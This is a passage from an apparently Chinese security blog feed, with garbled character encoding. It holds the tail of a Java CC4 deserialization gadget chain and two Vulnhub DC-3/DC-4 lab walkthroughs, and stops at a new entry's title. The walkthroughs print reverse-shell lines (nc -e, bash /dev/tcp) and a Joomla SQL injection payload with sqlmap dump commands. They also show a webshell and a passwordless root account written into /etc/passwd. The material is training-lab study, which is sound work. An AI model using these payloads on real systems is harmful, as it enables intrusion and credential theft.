class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));  </span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);  </span><br><span class="line">  </span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);  </span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);  </span><br><span class="line">        transformField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        transformField.set(transformingComparator, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        serialize(priorityQueue);  </span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307051249793.png" alt="image-20230705124940577"></p><h2 id="æµç¨‹å›¾"><a href="#æµç¨‹å›¾" class="headerlink" title="æµç¨‹å›¾"></a>æµç¨‹å›¾</h2><p>æ„Ÿè§‰CC4å­¦çš„æŒºè½»æ¾çš„ï¼Œä¸è¿‡å‰é¢çš„æœ‰äº›ä¸œè¥¿å¿˜è®°äº†ï¼Œè¿˜æ˜¯è¦å¤šæ€»ç»“ï¼Œæµç¨‹å›¾å¦‚ä¸‹ï¼Œç›´æ¥ç”»åœ¨ä¸€å †äº†ä¸å•ç‹¬ç”»äº†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307062015392.png" alt="image-20230706201426369"></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-4</title>
      <link href="/undefined/34858.html"/>
      <url>/undefined/34858.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></p><h2 id="å¼€å§‹æ‰“é¶"><a href="#å¼€å§‹æ‰“é¶" class="headerlink" title="å¼€å§‹æ‰“é¶"></a>å¼€å§‹æ‰“é¶</h2><p>æ‰«æå­˜æ´»IP<br><code>arp-scan -l</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042110558.png" alt="image-20230704210958475"><br>è®¿é—®å‡ºç°ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œæˆ‘çš„7ä¸‡æ•°æ®å¤§å­—å…¸éƒ½æ²¡çˆ†å‡ºæ¥ã€‚ã€‚ã€‚éš¾é“ä¸æ˜¯å¼±å£ä»¤ï¼Ÿï¼Ÿé admin&#x2F;adminè¿›å»äº†ï¼Œæˆ‘çš„å¤§å­—å…¸æ²¡æœ‰ï¼Ÿï¼Ÿä»”ç»†æŸ¥çœ‹å‘ç°æ ¹æœ¬æ²¡åšå¯†ç éªŒè¯ã€‚ã€‚ã€‚<br>è¿›å…¥å¯ä»¥æ‰§è¡Œä¸‰ä¸ªLinuxå‘½ä»¤<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042111368.png" alt="image-20230704211027412"><br>æŠ“ä¸ªåŒ…å‘ç°æ˜¯ä»»æ„ä»£ç æ‰§è¡Œï¼Œç›´æ¥å†™å…¥webshellå‘ç°å­˜åœ¨è¿‡æ»¤<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042110895.png" alt="image-20230704211037843"><br>base64ä¹‹åæ˜¾ç¤ºå†™å…¥æˆåŠŸï¼Œä½†æ˜¯æŸ¥çœ‹åˆæ²¡æœ‰æ–‡ä»¶å°±å¾ˆå¥‡æ€ªï¼Œçœ‹äº†wpå‘ç°ç›´æ¥å¼¹shellï¼Œä¹Ÿå¯¹å•Šï¼Œéƒ½èƒ½å‘½ä»¤æ‰§è¡Œäº†ä¸ºå•¥ä¸è¯•è¯•å¼¹ä¸ªshellå‘¢ã€‚ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">radio=nc+192.168.75.128+6666+-e+/bin/bash&amp;submit=Run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042111871.png" alt="image-20230704211134821"><br>ç„¶åç”¨pythonè·å–ä¸ªäº¤äº’å¼shellï¼ŒæŸ¥çœ‹rootæ²¡æœ‰æƒé™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042112524.png" alt="image-20230704211155202"></p><h2 id="eximææƒ"><a href="#eximææƒ" class="headerlink" title="eximææƒ"></a>eximææƒ</h2><p>ç„¶åå°±æ˜¯ææƒäº†ï¼ŒæŸ¥çœ‹å…·æœ‰suidæƒé™çš„å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042112458.png" alt="image-20230704211250399"><br>å­˜åœ¨exim4è¿™ä¸ªå¯ä»¥ç”¨æ¥ææƒï¼ŒæŸ¥çœ‹ä¸€ä¸‹ç‰ˆæœ¬<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113715.png" alt="image-20230704211301624"><br>ç„¶åmsfç›´æ¥æœç›¸å¯¹åº”çš„exp<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113333.png" alt="image-20230704211312249"><br>æˆ‘è¿™é‡Œå°†expå¤åˆ¶åˆ°äº†æˆ‘çš„ç”¨æˆ·ç›®å½•ä¸‹ï¼Œç„¶åç”¨pythonèµ·äº†ä¸€ä¸ªä¸´æ—¶æœåŠ¡ï¼Œå†åœ¨é¶æœºä¸Šä½¿ç”¨wgetä¸‹è½½expåˆ°tmpç›®å½•ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113032.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-4:/tmp$ wget http://192.168.75.128:8000/46996.sh</span><br><span class="line">wget http://192.168.75.128:8000/46996.sh</span><br><span class="line">--2023-07-04 22:29:12--  http://192.168.75.128:8000/46996.sh</span><br><span class="line">Connecting to 192.168.75.128:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3552 (3.5K) [text/x-sh]</span><br><span class="line">Saving to: &#x27;46996.sh&#x27;</span><br><span class="line"></span><br><span class="line">46996.sh            100%[===================&gt;]   3.47K  --.-KB/s    in 0s      </span><br><span class="line"></span><br><span class="line">2023-07-04 22:29:12 (62.2 MB/s) - &#x27;46996.sh&#x27; saved [3552/3552]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113307.png" alt="image-20230704211335280"><br>ç„¶åç»™æ–‡ä»¶èµ‹æ‰§è¡Œæƒé™å†è¿è¡Œå³å¯æå‡åˆ°root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 46996.sh</span><br><span class="line">./46996.sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113770.png" alt="image-20230704211344723"><br>rootç›®å½•ä¸‹å¾—åˆ°flag<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042113536.png" alt="image-20230704211352490"></p><h2 id="teeheeææƒ"><a href="#teeheeææƒ" class="headerlink" title="teeheeææƒ"></a>teeheeææƒ</h2><p>è¿™é‡Œæˆ‘ç›´æ¥è®°å½•ææƒçš„ä¸€éƒ¨åˆ†äº†ï¼Œå‰é¢çš„ç›´æ¥çœç•¥äº†ï¼Œæ„Ÿå…´è¶£å¯ä»¥åœ¨ç½‘ä¸Šçœ‹å…¶ä»–çš„wpï¼Œé€šè¿‡å‰é¢çš„æ“ä½œå¯ä»¥å¾—åˆ°charlesç”¨æˆ·çš„å¯†ç å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su charles</span><br><span class="line">^xHhA&amp;hvim0y  #å¯†ç </span><br></pre></td></tr></table></figure><p>åˆ‡æ¢åˆ°è¿™ä¸ªç”¨æˆ·ä½¿ç”¨å‘½ä»¤<code>sudo -l</code>æŸ¥çœ‹å…·æœ‰rootæƒé™çš„å‘½ä»¤<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042114230.png" alt="image-20230704211405178"><br>å‘ç°æœ‰ä¸ªteeheeå‘½ä»¤<br><strong>teeheeå‘½ä»¤å¯ä»¥å†™å…¥æ–‡ä»¶å†…å®¹å¹¶ä¸è¦†ç›–æ–‡ä»¶åŸæœ‰å†…å®¹</strong><br>å¯ä»¥ç”¨è¿™ä¸ªå‘½ä»¤å†™å…¥ä¸€ä¸ªæ— å¯†ç çš„adminç”¨æˆ·åˆ°&#x2F;etc&#x2F;passwdæ–‡ä»¶ï¼Œå¹¶åŠ å…¥åˆ°rootç»„ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042114723.png" alt="image-20230704211410690"><br>ç„¶ååˆ‡æ¢åˆ°adminç”¨æˆ·æˆåŠŸå˜ä¸ºrootæƒé™<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307042114681.png" alt="image-20230704211418608"></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--DC-3</title>
      <link href="/undefined/64126.html"/>
      <url>/undefined/64126.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="http://www.five86.com/downloads/DC-3-2.zip">http://www.five86.com/downloads/DC-3-2.zip</a><br>é•œåƒåœ°å€ï¼š<a href="https://download.vulnhub.com/dc/DC-3-2.zip">https://download.vulnhub.com/dc/DC-3-2.zip</a><br>åœ¨æ‰“å¼€çš„æ—¶å€™å‡ºäº†ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031340292.png" alt="image-20230703133956196"><br>è§£å†³æ–¹æ³•ï¼šåœ¨CD&#x2F;DVDé«˜çº§è®¾ç½®é‡Œé¢æ”¹ä¸ºå¦‚ä¸‹å³å¯<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031340610.png" alt="image-20230703134012551"></p><h2 id="å¼€å§‹æ‰“é¶"><a href="#å¼€å§‹æ‰“é¶" class="headerlink" title="å¼€å§‹æ‰“é¶"></a>å¼€å§‹æ‰“é¶</h2><p>ä»DC-3å¼€å§‹åªæœ‰ä¸€ä¸ªflagï¼Œå¾—ææƒåˆ°rootæ‰èƒ½æ‹¿åˆ°<br>æ‰«æå­˜æ´»IPï¼Œè®°å¾—æ”¹ä¸ºNATè¿æ¥<br><code>arp-scan -l</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031340977.png" alt="image-20230703134029937"><br>IPä¸º<strong>192.168.75.136</strong><br>æ¢æµ‹ä¸€ä¸‹å­˜æ´»ç«¯å£<br><code>nmap -A 192.168.75.136 </code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031340327.png"><br>æ‰«ä¸€ä¸‹ç›®å½•çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031341959.png" alt="image-20230703134126915"><br>æœ‰ä¸ªåå°ï¼Œå…ˆæ”¾ç€ï¼Œè®¿é—®ä¸€ä¸‹IPåˆ©ç”¨æ’ä»¶å‘ç°CMSä¸ºJoomla<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031341778.png" alt="image-20230703134155733"></p><h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p>çœ‹ä¸‹æœ‰æ²¡æœ‰å†å²æ¼æ´ï¼Œå‘ç°å­˜åœ¨sqlæ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.75.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031342864.png" alt="image-20230703134218819"><br>ç„¶åç”¨sqlmapä¸€æŠŠæ¢­çœ‹çœ‹æœ‰ä»€ä¹ˆä¸œè¥¿å§ï¼Œå°†æ•°æ®åŒ…ä¿å­˜åœ¨æ³¨å…¥çš„å‚æ•°åŠ ä¸ª<code>*</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031342657.png" alt="image-20230703134236625"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r &quot;/home/joker27/æ¡Œé¢/111.txt&quot; --dbs</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031342672.png" alt="image-20230703134249625"><br>åˆ°è¿™é‡Œå°±æ²¡å•¥åˆ©ç”¨æ€è·¯äº†ï¼Œè¡¨å®åœ¨å¤ªå¤šäº†ï¼Œæ‡’å¾—ä¸€ä¸ªä¸ªçŒœï¼Œçœ‹çœ‹wpå§ï¼Œå‘ç°æœ‰ä¸ªä¸“é—¨é’ˆå¯¹joomlaçš„å·¥å…·å®‰è£…ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install joomscan</span><br></pre></td></tr></table></figure><p>å¼€æ‰«<code>joomscan -u http://192.168.75.136</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031343261.png" alt="image-20230703134305215"><br>çœ‹åˆ°äº†ç‰ˆæœ¬ä¸º3.7.0ï¼Œè¿™ä¸ªç‰ˆæœ¬æœ‰sqlæ³¨å…¥å‰é¢å·²ç»åˆ©ç”¨è¿‡äº†ï¼Œä»wpå¾—çŸ¥å¯†ç åœ¨<code>#__users</code>è¡¨ä¸­ï¼Œæœ¬æ¥æƒ³é€šè¿‡æˆ‘å‰é¢çš„æ³¨å…¥æ–¹æ³•ç›´æ¥æŸ¥çœ‹çš„ï¼Œä½†æ˜¯å‘ç°æ²¡æ³•æŸ¥çœ‹æ•°æ®äº†ï¼Œåªèƒ½é€šè¿‡msfæ¥çœ‹ä¸€ä¸‹äº†ï¼Œæ²¡æ€ä¹ˆç”¨è¿‡msféƒ½ä¸å¤ªç†Ÿç»ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla 3.7.0</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031343141.png" alt="image-20230703134335109"><br>çœ‹wpè¿™é‡Œä¸èƒ½ç”¨msfç›´æ¥æ‰“ï¼Œæ‰€ä»¥å°±ç›´æ¥çœ‹çœ‹payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031343915.png" alt="image-20230703134346862"><br>å› ä¸ºå‰é¢çš„ä¸œè¥¿éƒ½å·²ç»æ³¨å‡ºæ¥äº†æ‰€ä»¥ç›´æ¥æ³¨åˆ—å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &#x27;#__users&#x27; --columns -p list[fullordering]</span><br></pre></td></tr></table></figure><p>å¾—åˆ°åˆ—å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031344803.png" alt="image-20230703134406761"><br>æ¥ä¸‹æ¥æŸ¥çœ‹æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &#x27;#__users&#x27; -C name,password,username --dump -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031344583.png" alt="image-20230703134421547"><br>å¯†ç æ˜¯åŠ å¯†çš„ç”¨johnçˆ†ç ´ä¸€ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031345400.png" alt="image-20230703134432752"><br>å¾—åˆ°å¯†ç snoopyï¼Œç™»å½•ä¸€ä¸‹åå°ï¼ŒæˆåŠŸç™»å½•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031345190.png" alt="image-20230703134547119"></p><h2 id="æ‹¿shell"><a href="#æ‹¿shell" class="headerlink" title="æ‹¿shell"></a>æ‹¿shell</h2><p>æ¥ä¸‹æ¥æ‰¾æ‰¾æœ‰æ²¡æœ‰ä¸Šä¼ ç‚¹å•¥çš„ï¼Œæœ€ç»ˆåœ¨ä¸‹é¢è¿™é‡Œå‘ç°å¯ä»¥ç›´æ¥ç”Ÿæˆæ–‡ä»¶<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031346665.png" alt="image-20230703134607616"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031346305.png" alt="image-20230703134618256"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031346130.png" alt="image-20230703134633073"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031346542.png" alt="image-20230703134644502"><br>å®³ï¼Œæ‰¾è·¯å¾„æ‰¾äº†åŠå¤©ã€‚ã€‚ã€‚<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031346356.png" alt="image-20230703134658292"><br>æˆ‘è¿™å°æœºå™¨æ²¡è£…èšå‰‘æ¢ä¸ªå·¥å…·ï¼Œåˆ©ç”¨kaliè‡ªå¸¦çš„weevely</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely generate cmd shell.php //ç”Ÿæˆshell</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031347730.png" alt="image-20230703134712673"><br>ä½†æ˜¯ç›´æ¥ä¸Šä¼ å¤±è´¥ä¼°è®¡é™åˆ¶äº†ï¼Œé‚£ä¹ˆå°±ç›´æ¥å°†ä»£ç å¤åˆ¶åˆ°ä¹‹å‰çš„é‚£ä¸ª1.phpé‡Œé¢<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031347122.png" alt="image-20230703134729073"><br>è¿æ¥æˆåŠŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely http://192.168.75.136/templates/bezz3/1.php cmd  //è¿æ¥</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031348106.png" alt="image-20230703134812024"><br>ä½¿ç”¨å‘½ä»¤<code>cat /etc/issue</code>æŸ¥çœ‹ç³»ç»Ÿå‘è¡Œç‰ˆæœ¬ä¿¡æ¯<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031351895.png" alt="image-20230703135102848"></p><h2 id="æ‹’ç»æœåŠ¡æ¼æ´ææƒ-é€šè¿‡weevelyè¿›è¡Œç»“æœå¤±è´¥"><a href="#æ‹’ç»æœåŠ¡æ¼æ´ææƒ-é€šè¿‡weevelyè¿›è¡Œç»“æœå¤±è´¥" class="headerlink" title="æ‹’ç»æœåŠ¡æ¼æ´ææƒ (é€šè¿‡weevelyè¿›è¡Œç»“æœå¤±è´¥)"></a>æ‹’ç»æœåŠ¡æ¼æ´ææƒ (é€šè¿‡weevelyè¿›è¡Œç»“æœå¤±è´¥)</h2><p>ç„¶åæœ¬åœ°å¯»æ‰¾ç›¸å…³ææƒæ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031351957.png" alt="image-20230703135118863"><br>æŸ¥çœ‹è¿™ä¸ªæ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/linux/local/39772.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031351160.png" alt="image-20230703135132114"><br>ä½¿ç”¨wgetå°†expä¸‹è½½åˆ°é¶æœº<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031352767.png" alt="image-20230703135202692"><br>çœ‹wpçš„æ—¶å€™ç‰ˆæœ¬ä¸ä¸€æ ·çš„è¯è¿™é‡Œæœ‰è¿™é‡Œé“¾æ¥æœ‰å¯èƒ½å¤±æ•ˆï¼Œæˆ‘è¿™ä¸ªåº”è¯¥å¯ä»¥ï¼Œå¦‚æœä¸‹è½½å¤±è´¥å¯ä»¥æ¢ä¸ªé“¾æ¥è¯•è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://gitee.com/aaaddc/exploitdb-bin-sploits/blob/master/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure><p>ç„¶åè§£å‹<code>unzip 39772.zip</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031353220.png" alt="image-20230703135310168"><br>è¿›å…¥39772ç›®å½•è§£å‹<code>exploit.tar</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf exploit.tar</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031353416.png" alt="image-20230703135326366"><br>è¿›å…¥è§£å‹åçš„ç›®å½•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031353970.png" alt="image-20230703135340924"><br>è¿è¡Œ<code>compile.sh</code>ç¼–è¯‘æ–‡ä»¶<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031353998.png" alt="image-20230703135351940"><br>ç„¶åæ‰§è¡Œ<code>./doubleput</code>ææƒ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031354358.png" alt="image-20230703135404296"><br>è¿™é‡Œæ‰§è¡Œå¤±è´¥äº†ï¼Œçœ‹äº†wpæœ‰çš„äººè¿™é‡Œä¹Ÿå¤±è´¥äº†ä¼°è®¡è¿™ä¸ªweevelyä¸å¤ªè¡Œ</p><h2 id="æ”¾å¼ƒweevelyé€šè¿‡åå¼¹shellè¿›è¡Œ"><a href="#æ”¾å¼ƒweevelyé€šè¿‡åå¼¹shellè¿›è¡Œ" class="headerlink" title="æ”¾å¼ƒweevelyé€šè¿‡åå¼¹shellè¿›è¡Œ"></a>æ”¾å¼ƒweevelyé€šè¿‡åå¼¹shellè¿›è¡Œ</h2><p>æ²¡åŠæ³•åªèƒ½æ¢ä¸ªæ–¹å¼äº†ï¼Œç›´æ¥åå¼¹ä¸ªshellåˆ°kaliä¸Šå§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.75.128/6666 0&gt;&amp;1&#x27; &quot;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031354597.png" alt="image-20230703135415550"><br>è®¿é—®é¡µé¢æ‹¿åˆ°shellï¼Œå› ä¸ºå‰é¢æ–‡ä»¶å·²ç»ä¸Šä¼ æ‰€ä»¥è¿™é‡Œç›´æ¥æ‰¾åˆ°æ–‡ä»¶æ‰§è¡Œå‘½ä»¤å°±è¡Œ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031354899.png" alt="image-20230703135438853"><br>ææƒæˆåŠŸï¼Œæ‹¿åˆ°flag<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031354139.png" alt="image-20230703135449069"></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sqlmap --os-shellåŸç†åˆ†æ</title>
      <link href="/undefined/59454.html"/>
      <url>/undefined/59454.html</url>
      
